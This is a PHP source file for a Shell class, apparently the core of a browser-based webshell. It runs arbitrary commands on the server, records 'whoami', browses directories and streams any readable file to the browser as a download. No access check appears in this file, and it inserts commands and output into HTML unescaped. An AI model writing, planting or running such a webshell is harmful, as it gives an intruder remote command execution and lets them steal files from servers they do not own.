<?php
namespace ishibashiTokyo;

class Shell extends Commands
{
    public function SessionInit()
    {
        if (empty($_SESSION['webshell']['path'])) {
            $_SESSION['webshell']['path'] =  realpath('./');
        }

        if (empty($_SESSION['webshell']['history'])){
            $_SESSION['webshell']['history'] = '';
        }

        if (empty($_SESSION['webshell']['sys_user'])) {
            $_SESSION['webshell']['sys_user'] = trim(shell_exec('whoami'));
        }
    }

    public function History_CurrentDirectory()
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '<div class="code shell">[%s@%s %s]</div>' . PHP_EOL,
            $_SESSION['webshell']['sys_user'],
            $_SERVER['SERVER_ADDR'],
            $_SESSION['webshell']['path']
        );
    }

    public function History_Command($cmd)
    {
        $_SESSION['webshell']['history'] .= sprintf(
            '<div class="code shell">$ %s</div>' . PHP_EOL,
            $cmd
        );
    }

    public function History_Result($result)
    {
        $_SESSION['webshell']['history'] .= sprintf('<div class="code">%s</div>' . PHP_EOL, $result);
    }

    public function clear()
    {
        $this->Cmd_clear();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function cd($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->Cmd_cd($cmd);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function ll($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->History_Result($this->Cmd_ll($cmd));
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }

    public function exec($cmd)
    {
        $this->History_CurrentDirectory();
        $this->History_Command($cmd);
        $this->History_Result($this->Cmd_exec($cmd));
    }

    /**
     * ファイルダウンロード用ストリーム処理
     *
     * @param [type] $path
     * @return void
     */
    public function Download($path)
    {
        $path = urldecode($path);
        // ファイルに読み込み権限がない場合
        if (!is_readable($path)) {
            die($path);
        }

        $mimeType = (new \finfo(FILEINFO_MIME_TYPE))->file($path);
        if (!preg_match('/\A\S+?\/\S+/', $mimeType)) {
            $mimeType = 'application/octet-stream';
        }

        header('Content-Type: ' . $mimeType);
        header('X-Content-Type-Options: nosniff');
        header('Content-Length: ' . filesize($path));
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Connection: close');
        while (ob_get_level()) { ob_end_clean(); }
        readfile($path);
        exit;
    }
}